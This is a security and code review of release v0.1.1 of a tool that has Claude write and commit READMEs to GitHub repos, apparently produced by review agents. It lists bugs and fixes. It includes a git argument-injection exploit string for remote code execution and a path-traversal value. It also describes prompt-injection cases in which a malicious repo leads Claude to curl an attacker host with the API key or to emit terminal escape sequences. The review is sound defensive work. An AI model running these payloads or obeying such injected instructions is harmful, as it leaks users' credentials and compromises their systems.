# Security & Code Review — release/v0.1.1

Two-agent review: `code-reviewer` + `security-reviewer` (red-team).

---

## Code Review

### HIGH

- **`src/fetch.py:171`** — `_check_user_mismatch` calls `input(prompt)` but discards the return value. Prompt is cosmetic; pipeline always proceeds regardless of user response. Duplicate of correct check in `gh_readme_pipeline.py:166-170`.
  - **Fix:** delete the duplicate, or capture input and `raise SystemExit` on non-`y`.

- **`src/commit.py:178-179, 207-208, 230-231`** — `git add` and `git commit` invoked with `check=False`; returncode never inspected. GPG signing failure, pre-commit hook rejection, or "nothing to commit" silently returns `status="pushed"` / `"pr_opened"` / `"commit_only"`. State store records false success.
  - **Fix:** check returncode after both calls; return `CommitResult(status="failed", error=...)` on non-zero.

- **`src/fetch.py:152` + `gh_readme_pipeline.py:422`** — `_fetch_page` uses `check=True`. Network failure or non-200 from GraphQL raises `CalledProcessError`. `main()` has no try/except around `fetch_repos`. User sees raw Python traceback.
  - **Fix:** wrap in `try/except (CalledProcessError, JSONDecodeError)` with human-readable error.

### MEDIUM

- **`gh_readme_pipeline.py:302-308`** — `KeyboardInterrupt` block calls `safety.ensure_clean(repo_dir)`, then `finally` block calls it again. Idempotent but wasteful and noisy.
- **`src/review.py:139-143`** — `_blast_radius_ok` comment claims `"old -> new"` rename format; actual git porcelain v1 is tab-separated `R  old\tnew`. Logic accidentally works for rejection case but fragile when a non-README is renamed *to* `README.md`.
- **`src/commit.py:213`** — `_run_direct_mode` uses bare `git push` (no explicit remote/branch). `_run_pr_mode` correctly uses `git push -u origin <branch>`. Mirror that.
- **`src/safety.py:31-46`** — `validate_ssh_url` accepts any URL starting with `https://github.com/`. No `owner/repo` regex. `https://github.com/--upload-pack=evil` passes prefix check.

### LOW

- **`gh_readme_pipeline.py:426`** — `state_store._state_file.exists()` reaches into private attribute. Add `has_prior_state()` to `StateStore`.
- **`src/fetch.py:158`** — `import os` at function scope; module-scope elsewhere.

---

## Red-Team Review

### CRITICAL

**CRIT-1 — Argument injection via `REF` (install.sh:69)**
```bash
git clone -q --depth=1 --branch "$REF" "$REPO_URL" "$WORKDIR/program"
```
`REF` env var unvalidated. Git treats values starting with `-` as flags.
**Exploit:** `REF='--config=core.sshCommand=id>/tmp/pwned' bash install.sh` → RCE.
SHA-pinned path is safe (regex on line 50). Branch path is not.
**Fix:** validate `REF` with `^[A-Za-z0-9._/-]+$` before use, or use `--branch=$REF` single-token form.

**CRIT-2 — Newline injection via `COMMIT_MESSAGE` (commit.py:179, 194, 208, 231)**
`os.environ.get("COMMIT_MESSAGE")` flows verbatim into `git commit -m` and `gh pr create --title/--body`. Newlines inject trailers (`Signed-off-by`, `Co-authored-by`) into commit metadata, or break `gh` API call when in PR title.
**Fix:** strip `\n` and `\r`; reject if found.

### HIGH

- **HIGH-1 — Unpinned fallback branch (install.sh:65-69)** — When `EXPECTED_SHA` is zeroes/missing, fallback fetches `REF` with no SHA pinning. Repo writer can serve arbitrary code.

- **HIGH-2 — Credential exfil via Claude subprocess env (review.py:108, gh_readme_pipeline.py:154-156)** — `claude` invoked with `--permission-mode acceptEdits` inherits full env (`ANTHROPIC_API_KEY`, `GH_TOKEN`, `GITHUB_TOKEN`, `AWS_*`). Malicious public repo with `.claude/commands/create-readme.md` containing exfil prompt → `curl https://attacker/?t=$ANTHROPIC_API_KEY`.
  **Fix:** scrub env before subprocess; warn before processing repos not owned by authenticated user.

- **HIGH-3 — Blast-radius guard bypass (review.py:140-146)** — Parses `git status --porcelain` text with `split()`. Filenames with spaces or git-quoted paths produce `parts[-1]` ≠ full path. Attacker repo with crafted filename can defeat `paths == {"README.md"}` check, allowing Claude to write arbitrary files in the cloned repo (then committed).
  **Fix:** use `git status --porcelain=v1 -z` (NUL-delim) or `git diff --name-only --diff-filter=ACMRT`.

- **HIGH-4 — User-mismatch confirm ignored (fetch.py:171)** — Same as code-review HIGH. Operator with mistaken `GH_USER=victim` proceeds and pushes READMEs to victim's repos.

### MEDIUM

- **MED-1 — `/tmp` artifacts on SIGKILL (install.sh:41-48)** — Bash `trap EXIT` does not fire on `SIGKILL`/poweroff. `WORKDIR` under world-readable `/tmp` may contain repo secrets (`.env`, `*.pem` — risky-file scan only warns). Multi-user systems = exposure window.
  **Mitigation:** consider `/run/user/$UID` (tmpfs, user-private). Document.

- **MED-2 — `validate_ssh_url` permissive (safety.py:44)** — Same as code-review MED. Strengthen to `^https://github\.com/[A-Za-z0-9._-]+/[A-Za-z0-9._-]+(\.git)?$`.

- **MED-3 — Terminal escape injection (review.py:62-64)** — `_show_pager` uses `less -R` which renders ANSI/OSC. Malicious repo can prompt-inject Claude to embed escape sequences in generated README → terminal title/clipboard hijack on display.
  **Fix:** drop `-R`, or strip ANSI/OSC before pager.

### LOW

- **LOW-1 — Path traversal via `GH_USER` (state.py:72)** — `f"state-{user}.jsonl"`. `GH_USER=../../etc/...` not sanitized. Validate against `_REPO_NAME_RE` before constructing path.

---

## Priority Fix List for v0.1.1

1. CRIT-1 — regex-validate `REF` in `install.sh`
2. CRIT-2 — strip newlines from `COMMIT_MESSAGE`
3. HIGH-2 — scrub env before `claude` subprocess
4. HIGH-3 — `-z` NUL-delim porcelain parse in `_blast_radius_ok`
5. HIGH-4 / code-review HIGH — fix `_check_user_mismatch` return-value bug
6. code-review HIGH — check `git add`/`commit` returncode in all three modes
7. code-review HIGH — try/except around `fetch_repos` in `main()`

---

## Summary Table

| ID | Sev | File | Issue |
|----|-----|------|-------|
| CRIT-1 | CRIT | install.sh:69 | `REF` flag injection → RCE |
| CRIT-2 | CRIT | commit.py:179,194 | `COMMIT_MESSAGE` newline → metadata/PR injection |
| RT-H1 | HIGH | install.sh:65-69 | Unpinned fallback branch |
| RT-H2 | HIGH | review.py:108 | Credentials inherited by Claude subprocess |
| RT-H3 | HIGH | review.py:140-146 | Blast-radius bypass via filename whitespace |
| CR-H1 / RT-H4 | HIGH | fetch.py:171 | User-mismatch input discarded |
| CR-H2 | HIGH | commit.py:178+ | Silent git add/commit failures → false state |
| CR-H3 | HIGH | fetch.py:152 | Raw traceback on network error |
| CR-M1 | MED | gh_readme_pipeline.py:302 | Double `ensure_clean` |
| CR-M2 | MED | review.py:139 | Wrong porcelain rename comment |
| CR-M3 | MED | commit.py:213 | Bare `git push` no remote |
| CR-M4 / RT-M2 | MED | safety.py:31 | Loose HTTPS URL validation |
| RT-M1 | MED | install.sh:41 | `/tmp` artifacts on SIGKILL |
| RT-M3 | MED | review.py:62 | ANSI escape via `less -R` |
| CR-L1 | LOW | gh_readme_pipeline.py:426 | Private attr access |
| CR-L2 | LOW | fetch.py:158 | Func-scope `import os` |
| RT-L1 | LOW | state.py:72 | Path traversal via `GH_USER` |
